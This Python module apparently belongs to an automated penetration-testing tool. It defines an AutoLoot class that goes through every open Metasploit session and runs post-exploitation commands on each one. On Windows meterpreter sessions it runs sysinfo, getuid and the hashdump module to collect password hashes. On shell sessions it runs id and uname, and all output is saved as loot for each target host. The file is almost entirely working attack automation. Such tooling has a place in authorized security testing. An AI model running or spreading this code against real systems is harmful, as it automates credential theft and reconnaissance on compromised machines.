from __future__ import annotations

import logging
import time
from pathlib import Path
from typing import Any

from .metasploit import MetasploitIntegration

logger = logging.getLogger(__name__)


class AutoLoot:
    def __init__(self, msf: MetasploitIntegration, output_dir: Path):
        self.msf = msf
        self.output_dir = output_dir / "loot"
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def loot_session(self, session_id: str, session_info: dict) -> dict[str, Any]:
        """
        Runs a standard set of post-exploitation commands based on session type.
        """
        session_type = session_info.get("type", "unknown")
        target_host = session_info.get("target_host", "unknown")
        
        logger.info(f"Looting session {session_id} ({session_type}) on {target_host}...")
        
        loot_data = {}
        host_dir = self.output_dir / target_host
        host_dir.mkdir(exist_ok=True)

        if session_type == "meterpreter":
            # 1. Get System Info
            sysinfo = self.msf.run_on_session(session_id, "sysinfo")
            loot_data["sysinfo"] = sysinfo
            (host_dir / "sysinfo.txt").write_text(sysinfo, encoding="utf-8", errors="ignore")

            # 2. Get User ID
            uid = self.msf.run_on_session(session_id, "getuid")
            loot_data["uid"] = uid
            (host_dir / "uid.txt").write_text(uid, encoding="utf-8", errors="ignore")

            # 3. Hashdump (Windows only usually, but try anyway)
            # Note: hashdump might require privileges
            if "windows" in sysinfo.lower():
                logger.info("Attempting hashdump...")
                self.msf.run_on_session(session_id, "run post/windows/gather/hashdump")
                # Output collection for post modules is trickier via RPC, usually need to read console
            
            # 4. Screenshot
            # self.msf.run_on_session(session_id, "screenshot") 
            # Screenshot saves to MSF server, not easily retrieved via simple write/read without file download API

        elif session_type == "shell":
            # Basic shell commands
            id_out = self.msf.run_on_session(session_id, "id")
            loot_data["id"] = id_out
            (host_dir / "id.txt").write_text(id_out, encoding="utf-8", errors="ignore")
            
            uname = self.msf.run_on_session(session_id, "uname -a")
            loot_data["uname"] = uname
            (host_dir / "uname.txt").write_text(uname, encoding="utf-8", errors="ignore")

        return loot_data

    def loot_all_sessions(self):
        sessions = self.msf.list_sessions()
        results = {}
        for sid, info in sessions.items():
            results[sid] = self.loot_session(sid, info)
        return results
